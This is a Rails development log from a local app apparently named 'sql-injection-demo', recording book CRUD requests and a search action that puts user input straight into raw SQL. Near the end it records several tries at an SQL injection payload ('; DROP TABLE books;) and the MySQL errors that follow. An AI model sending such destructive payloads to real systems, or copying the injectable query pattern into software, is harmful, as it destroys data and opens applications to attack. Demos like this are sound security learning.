@@ -1,0 +1,1312 @@
+Started GET "/" for 127.0.0.1 at 2017-09-30 17:36:11 +0800
+  
+ActiveRecord::NoDatabaseError (Unknown database 'sql-injection-demo_development'):
+  
+activerecord (5.0.6) lib/active_record/connection_adapters/mysql2_adapter.rb:29:in `rescue in mysql2_connection'
+activerecord (5.0.6) lib/active_record/connection_adapters/mysql2_adapter.rb:12:in `mysql2_connection'
+activerecord (5.0.6) lib/active_record/connection_adapters/abstract/connection_pool.rb:729:in `new_connection'
+activerecord (5.0.6) lib/active_record/connection_adapters/abstract/connection_pool.rb:773:in `checkout_new_connection'
+activerecord (5.0.6) lib/active_record/connection_adapters/abstract/connection_pool.rb:752:in `try_to_checkout_new_connection'
+activerecord (5.0.6) lib/active_record/connection_adapters/abstract/connection_pool.rb:713:in `acquire_connection'
+activerecord (5.0.6) lib/active_record/connection_adapters/abstract/connection_pool.rb:490:in `checkout'
+activerecord (5.0.6) lib/active_record/connection_adapters/abstract/connection_pool.rb:364:in `connection'
+activerecord (5.0.6) lib/active_record/connection_adapters/abstract/connection_pool.rb:883:in `retrieve_connection'
+activerecord (5.0.6) lib/active_record/connection_handling.rb:128:in `retrieve_connection'
+activerecord (5.0.6) lib/active_record/connection_handling.rb:91:in `connection'
+activerecord (5.0.6) lib/active_record/migration.rb:559:in `connection'
+activerecord (5.0.6) lib/active_record/migration.rb:546:in `call'
+actionpack (5.0.6) lib/action_dispatch/middleware/callbacks.rb:38:in `block in call'
+activesupport (5.0.6) lib/active_support/callbacks.rb:97:in `__run_callbacks__'
+activesupport (5.0.6) lib/active_support/callbacks.rb:750:in `_run_call_callbacks'
+activesupport (5.0.6) lib/active_support/callbacks.rb:90:in `run_callbacks'
+actionpack (5.0.6) lib/action_dispatch/middleware/callbacks.rb:36:in `call'
+actionpack (5.0.6) lib/action_dispatch/middleware/executor.rb:12:in `call'
+actionpack (5.0.6) lib/action_dispatch/middleware/remote_ip.rb:79:in `call'
+actionpack (5.0.6) lib/action_dispatch/middleware/debug_exceptions.rb:49:in `call'
+web-console (3.5.1) lib/web_console/middleware.rb:135:in `call_app'
+web-console (3.5.1) lib/web_console/middleware.rb:28:in `block in call'
+web-console (3.5.1) lib/web_console/middleware.rb:18:in `catch'
+web-console (3.5.1) lib/web_console/middleware.rb:18:in `call'
+actionpack (5.0.6) lib/action_dispatch/middleware/show_exceptions.rb:31:in `call'
+railties (5.0.6) lib/rails/rack/logger.rb:36:in `call_app'
+railties (5.0.6) lib/rails/rack/logger.rb:24:in `block in call'
+activesupport (5.0.6) lib/active_support/tagged_logging.rb:69:in `block in tagged'
+activesupport (5.0.6) lib/active_support/tagged_logging.rb:26:in `tagged'
+activesupport (5.0.6) lib/active_support/tagged_logging.rb:69:in `tagged'
+railties (5.0.6) lib/rails/rack/logger.rb:24:in `call'
+sprockets-rails (3.2.1) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (5.0.6) lib/action_dispatch/middleware/request_id.rb:24:in `call'
+rack (2.0.3) lib/rack/method_override.rb:22:in `call'
+rack (2.0.3) lib/rack/runtime.rb:22:in `call'
+activesupport (5.0.6) lib/active_support/cache/strategy/local_cache_middleware.rb:28:in `call'
+actionpack (5.0.6) lib/action_dispatch/middleware/executor.rb:12:in `call'
+actionpack (5.0.6) lib/action_dispatch/middleware/static.rb:136:in `call'
+rack (2.0.3) lib/rack/sendfile.rb:111:in `call'
+railties (5.0.6) lib/rails/engine.rb:522:in `call'
+puma (3.10.0) lib/puma/configuration.rb:225:in `call'
+puma (3.10.0) lib/puma/server.rb:605:in `handle_request'
+puma (3.10.0) lib/puma/server.rb:437:in `process_client'
+puma (3.10.0) lib/puma/server.rb:301:in `block in run'
+puma (3.10.0) lib/puma/thread_pool.rb:120:in `block in spawn_thread'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (1.6ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (0.9ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (69.9ms)
+  [1m[35m (22.2ms)[0m  [1m[35mCREATE TABLE `schema_migrations` (`version` varchar(255) PRIMARY KEY) ENGINE=InnoDB[0m
+  [1m[35m (9.1ms)[0m  [1m[35mCREATE TABLE `ar_internal_metadata` (`key` varchar(255) PRIMARY KEY, `value` varchar(255), `created_at` datetime NOT NULL, `updated_at` datetime NOT NULL) ENGINE=InnoDB[0m
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT DATABASE() as db[0m
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT GET_LOCK('2346284283161265405', 0);[0m
+  [1m[36mActiveRecord::SchemaMigration Load (3.0ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+Migrating to CreateBooks (20170930093602)
+  [1m[35m (7.6ms)[0m  [1m[35mCREATE TABLE `books` (`id` int AUTO_INCREMENT PRIMARY KEY, `title` varchar(255), `description` varchar(255), `created_at` datetime NOT NULL, `updated_at` datetime NOT NULL) ENGINE=InnoDB[0m
+  [1m[35m (0.1ms)[0m  [1m[35mBEGIN[0m
+  [1m[35mSQL (0.1ms)[0m  [1m[32mINSERT INTO `schema_migrations` (`version`) VALUES ('20170930093602')[0m
+  [1m[35m (0.2ms)[0m  [1m[35mCOMMIT[0m
+  [1m[36mActiveRecord::InternalMetadata Load (0.1ms)[0m  [1m[34mSELECT  `ar_internal_metadata`.* FROM `ar_internal_metadata` WHERE `ar_internal_metadata`.`key` = 'environment' LIMIT 1[0m
+  [1m[35m (0.1ms)[0m  [1m[35mBEGIN[0m
+  [1m[35mSQL (0.1ms)[0m  [1m[32mINSERT INTO `ar_internal_metadata` (`key`, `value`, `created_at`, `updated_at`) VALUES ('environment', 'development', '2017-09-30 09:36:27', '2017-09-30 09:36:27')[0m
+  [1m[35m (0.2ms)[0m  [1m[35mCOMMIT[0m
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT RELEASE_LOCK('2346284283161265405')[0m
+  [1m[36mActiveRecord::SchemaMigration Load (0.1ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+  [1m[35m (0.1ms)[0m  [1m[35mSHOW CREATE TABLE `books`[0m
+  [1m[35m (0.2ms)[0m  [1m[35mSHOW TABLE STATUS LIKE 'books'[0m
+Started GET "/" for 127.0.0.1 at 2017-09-30 17:36:28 +0800
+  [1m[36mActiveRecord::SchemaMigration Load (0.2ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+Processing by Rails::WelcomeController#index as HTML
+  Parameters: {"internal"=>true}
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/railties-5.0.6/lib/rails/templates/rails/welcome/index.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/railties-5.0.6/lib/rails/templates/rails/welcome/index.html.erb (1.6ms)
+Completed 200 OK in 12ms (Views: 3.9ms | ActiveRecord: 0.0ms)
+
+
+Started GET "/books" for 127.0.0.1 at 2017-09-30 17:36:34 +0800
+Processing by BooksController#index as HTML
+  Rendering books/index.html.erb within layouts/application
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT `books`.* FROM `books`[0m
+  Rendered books/index.html.erb within layouts/application (1.6ms)
+Completed 200 OK in 521ms (Views: 518.4ms | ActiveRecord: 0.4ms)
+
+
+Started GET "/books" for 127.0.0.1 at 2017-09-30 17:37:01 +0800
+Processing by BooksController#index as HTML
+  Rendering books/index.html.erb within layouts/application
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT `books`.* FROM `books`[0m
+  Rendered books/index.html.erb within layouts/application (1.1ms)
+Completed 200 OK in 16ms (Views: 13.8ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books" for 127.0.0.1 at 2017-09-30 17:37:05 +0800
+Processing by BooksController#index as HTML
+  Rendering books/index.html.erb within layouts/application
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT `books`.* FROM `books`[0m
+  Rendered books/index.html.erb within layouts/application (1.0ms)
+Completed 200 OK in 21ms (Views: 18.9ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books" for 127.0.0.1 at 2017-09-30 17:37:08 +0800
+Processing by BooksController#index as HTML
+  Rendering books/index.html.erb within layouts/application
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT `books`.* FROM `books`[0m
+  Rendered books/index.html.erb within layouts/application (1.2ms)
+Completed 200 OK in 19ms (Views: 17.0ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books" for 127.0.0.1 at 2017-09-30 17:37:52 +0800
+Processing by BooksController#index as HTML
+  Rendering books/index.html.erb within layouts/application
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT `books`.* FROM `books`[0m
+  Rendered books/index.html.erb within layouts/application (1.2ms)
+Completed 200 OK in 19ms (Views: 17.5ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books" for 127.0.0.1 at 2017-09-30 17:37:56 +0800
+Processing by BooksController#index as HTML
+  Rendering books/index.html.erb within layouts/application
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT `books`.* FROM `books`[0m
+  Rendered books/index.html.erb within layouts/application (1.2ms)
+Completed 200 OK in 21ms (Views: 19.2ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search" for 127.0.0.1 at 2017-09-30 17:37:58 +0800
+Processing by BooksController#show as HTML
+  Parameters: {"id"=>"search"}
+  [1m[36mBook Load (0.1ms)[0m  [1m[34mSELECT  `books`.* FROM `books` WHERE `books`.`id` = 0 LIMIT 1[0m
+Completed 404 Not Found in 3ms (ActiveRecord: 0.5ms)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Book with 'id'=search):
+  
+app/controllers/books_controller.rb:67:in `set_book'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.4ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.6ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (69.7ms)
+Started GET "/books/search" for 127.0.0.1 at 2017-09-30 17:40:26 +0800
+Processing by BooksController#search as HTML
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.8ms)
+Completed 200 OK in 15ms (Views: 12.7ms | ActiveRecord: 0.4ms)
+
+
+Started GET "/books/new" for 127.0.0.1 at 2017-09-30 17:40:27 +0800
+Processing by BooksController#new as HTML
+  Rendering books/new.html.erb within layouts/application
+  Rendered books/_form.html.erb (7.8ms)
+  Rendered books/new.html.erb within layouts/application (9.3ms)
+Completed 200 OK in 30ms (Views: 24.4ms | ActiveRecord: 0.7ms)
+
+
+Started POST "/books" for 127.0.0.1 at 2017-09-30 17:40:31 +0800
+Processing by BooksController#create as HTML
+  Parameters: {"utf8"=>"✓", "authenticity_token"=>"LzR/KWh35pTyKIh+Bvm8vRYG01fNWnaLcRIaxZVTsOjBIL3oFr6sV/utnJ2azbshJY0jKOwwAcKvXvRWe8WtqA==", "book"=>{"title"=>"Testing", "description"=>"12"}, "commit"=>"Create Book"}
+  [1m[35m (0.1ms)[0m  [1m[35mBEGIN[0m
+  [1m[35mSQL (0.2ms)[0m  [1m[32mINSERT INTO `books` (`title`, `description`, `created_at`, `updated_at`) VALUES ('Testing', '12', '2017-09-30 09:40:31', '2017-09-30 09:40:31')[0m
+  [1m[35m (0.3ms)[0m  [1m[35mCOMMIT[0m
+Redirected to http://localhost:3000/books/1
+Completed 302 Found in 3ms (ActiveRecord: 0.6ms)
+
+
+Started GET "/books/1" for 127.0.0.1 at 2017-09-30 17:40:31 +0800
+Processing by BooksController#show as HTML
+  Parameters: {"id"=>"1"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT  `books`.* FROM `books` WHERE `books`.`id` = 1 LIMIT 1[0m
+  Rendering books/show.html.erb within layouts/application
+  Rendered books/show.html.erb within layouts/application (0.5ms)
+Completed 200 OK in 14ms (Views: 12.0ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books" for 127.0.0.1 at 2017-09-30 17:40:33 +0800
+Processing by BooksController#index as HTML
+  Rendering books/index.html.erb within layouts/application
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT `books`.* FROM `books`[0m
+  Rendered books/index.html.erb within layouts/application (1.3ms)
+Completed 200 OK in 15ms (Views: 12.5ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/new" for 127.0.0.1 at 2017-09-30 17:40:35 +0800
+Processing by BooksController#new as HTML
+  Rendering books/new.html.erb within layouts/application
+  Rendered books/_form.html.erb (1.3ms)
+  Rendered books/new.html.erb within layouts/application (2.8ms)
+Completed 200 OK in 16ms (Views: 14.1ms | ActiveRecord: 0.0ms)
+
+
+Started POST "/books" for 127.0.0.1 at 2017-09-30 17:40:40 +0800
+Processing by BooksController#create as HTML
+  Parameters: {"utf8"=>"✓", "authenticity_token"=>"4bNuzfBIo1XAOAIC/j7mYNvrJp2i64jiCI927M7i2QEPp6wMjoHplsm9FuFiCuH86GDW4oOB/6vWw5h/IHTEQQ==", "book"=>{"title"=>"James", "description"=>"Huynh"}, "commit"=>"Create Book"}
+  [1m[35m (0.1ms)[0m  [1m[35mBEGIN[0m
+  [1m[35mSQL (0.2ms)[0m  [1m[32mINSERT INTO `books` (`title`, `description`, `created_at`, `updated_at`) VALUES ('James', 'Huynh', '2017-09-30 09:40:40', '2017-09-30 09:40:40')[0m
+  [1m[35m (5.5ms)[0m  [1m[35mCOMMIT[0m
+Redirected to http://localhost:3000/books/2
+Completed 302 Found in 8ms (ActiveRecord: 5.7ms)
+
+
+Started GET "/books/2" for 127.0.0.1 at 2017-09-30 17:40:40 +0800
+Processing by BooksController#show as HTML
+  Parameters: {"id"=>"2"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT  `books`.* FROM `books` WHERE `books`.`id` = 2 LIMIT 1[0m
+  Rendering books/show.html.erb within layouts/application
+  Rendered books/show.html.erb within layouts/application (0.5ms)
+Completed 200 OK in 14ms (Views: 12.3ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books" for 127.0.0.1 at 2017-09-30 17:40:42 +0800
+Processing by BooksController#index as HTML
+  Rendering books/index.html.erb within layouts/application
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT `books`.* FROM `books`[0m
+  Rendered books/index.html.erb within layouts/application (1.3ms)
+Completed 200 OK in 19ms (Views: 16.7ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search" for 127.0.0.1 at 2017-09-30 17:40:44 +0800
+Processing by BooksController#search as HTML
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.7ms)
+Completed 200 OK in 14ms (Views: 13.1ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search" for 127.0.0.1 at 2017-09-30 17:41:09 +0800
+Started GET "/books/new" for 127.0.0.1 at 2017-09-30 17:41:09 +0800
+Processing by BooksController#search as HTML
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.9ms)
+Completed 200 OK in 18ms (Views: 13.3ms | ActiveRecord: 0.5ms)
+
+
+Processing by BooksController#new as HTML
+  Rendering books/new.html.erb within layouts/application
+  Rendered books/_form.html.erb (1.6ms)
+  Rendered books/new.html.erb within layouts/application (2.8ms)
+Completed 200 OK in 26ms (Views: 19.6ms | ActiveRecord: 0.0ms)
+
+
+Started GET "/books/search?keyword=james" for 127.0.0.1 at 2017-09-30 17:41:11 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"james"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%james%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.6ms)
+Completed 200 OK in 12ms (Views: 11.2ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=asd" for 127.0.0.1 at 2017-09-30 17:41:13 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"asd"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%asd%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.6ms)
+Completed 200 OK in 12ms (Views: 11.2ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=" for 127.0.0.1 at 2017-09-30 17:41:15 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>""}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.7ms)
+Completed 200 OK in 13ms (Views: 12.2ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=" for 127.0.0.1 at 2017-09-30 17:41:19 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>""}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.7ms)
+Completed 200 OK in 13ms (Views: 12.2ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=aa" for 127.0.0.1 at 2017-09-30 17:41:21 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"aa"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%aa%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.5ms)
+Completed 200 OK in 13ms (Views: 11.8ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=" for 127.0.0.1 at 2017-09-30 17:41:22 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>""}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.7ms)
+Completed 200 OK in 16ms (Views: 15.5ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=%27%3BDROP+TABLE+books%3B%27" for 127.0.0.1 at 2017-09-30 17:41:53 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"';DROP TABLE books;'"}
+  [1m[36mBook Load (0.5ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%';DROP TABLE books;'%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.5ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;'%'' at line 1: SELECT * FROM books WHERE title LIKE '%';DROP TABLE books;'%'):
+  
+app/controllers/books_controller.rb:11:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.6ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.2ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.6ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (62.9ms)
+Started GET "/books/search?keyword=" for 127.0.0.1 at 2017-09-30 17:42:09 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>""}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.7ms)
+Completed 200 OK in 15ms (Views: 13.6ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=%27%3BDROP+TABLE+books%3B%27SELECT" for 127.0.0.1 at 2017-09-30 17:42:17 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"';DROP TABLE books;'SELECT"}
+  [1m[36mBook Load (0.4ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%';DROP TABLE books;'SELECT%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.4ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;'SELECT%'' at line 1: SELECT * FROM books WHERE title LIKE '%';DROP TABLE books;'SELECT%'):
+  
+app/controllers/books_controller.rb:11:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.6ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (59.8ms)
+Started GET "/books/search?keyword=%27%3BDROP+TABLE+books%3B%27SELECT+" for 127.0.0.1 at 2017-09-30 17:42:24 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"';DROP TABLE books;'SELECT "}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%';DROP TABLE books;'SELECT %'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;'SELECT %'' at line 1: SELECT * FROM books WHERE title LIKE '%';DROP TABLE books;'SELECT %'):
+  
+app/controllers/books_controller.rb:11:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (6.8ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (2.7ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.8ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (66.9ms)
+Started GET "/books/search?keyword=%27%3BDROP+TABLE+books%3BSELECT" for 127.0.0.1 at 2017-09-30 17:42:36 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"';DROP TABLE books;SELECT"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%';DROP TABLE books;SELECT%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;SELECT%'' at line 1: SELECT * FROM books WHERE title LIKE '%';DROP TABLE books;SELECT%'):
+  
+app/controllers/books_controller.rb:11:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (3.0ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
